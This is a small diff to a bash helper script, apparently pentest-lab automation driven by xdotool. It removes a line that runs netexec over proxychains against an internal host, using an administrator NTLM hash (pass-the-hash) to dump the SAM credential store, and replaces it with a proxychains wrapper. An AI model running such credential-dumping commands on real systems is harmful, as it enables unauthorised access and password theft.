@@ -1,5 +1,6 @@
 #!/bin/bash
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
+source ~/Desktop/base/code/xdotool/helpers/run_with_proxychains.sh
 
-paste_command "proxychains netexec smb 172.16.8.20 --local-auth -u administrator -H 0e20798f695ab0d04bc138b22344cea8 --sam"
+run_with_proxychains $0
